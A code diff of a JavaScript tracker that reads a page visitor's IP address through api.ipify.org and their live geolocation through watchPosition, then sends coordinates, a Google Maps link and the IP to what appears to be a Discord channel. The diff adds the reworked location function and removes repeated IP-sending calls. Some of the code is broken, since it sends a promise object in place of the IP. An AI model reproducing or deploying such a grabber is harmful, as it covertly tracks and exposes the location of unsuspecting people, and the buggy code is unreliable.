@@ -16,14 +16,6 @@ function discord_msg(mesage) {
         });
 };
 
-async function get_location() {
-    dosomething = navigator.geolocation.watchPosition((position) => {
-        discord_msg(position.coords.latitude + " " + position.coords.longitude);
-        discord_msg("https://www.google.no/maps/@" + position.coords.latitude + "," + position.coords.longitude + "m/");
-
-      });
-};
-
 async function get_ip() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -33,12 +25,13 @@ async function get_ip() {
         console.error('Error fetching IP address:', error);
     }
 };
+
+async function get_location() {
+    dosomething = navigator.geolocation.watchPosition((position) => {
+        discord_msg("ip: " + get_ip())
+        discord_msg("latitude: " + position.coords.latitude + " longitude: " + position.coords.longitude);
+        discord_msg("https://www.google.no/maps/@" + position.coords.latitude + "," + position.coords.longitude + "m/");
+
+      });
+};
  
-discord_msg(get_ip);
-discord_msg(get_ip);
-discord_msg(get_ip);
-discord_msg(get_ip);
-discord_msg(get_ip);
-discord_msg(get_ip);
-discord_msg(get_ip);
-discord_msg(get_ip);
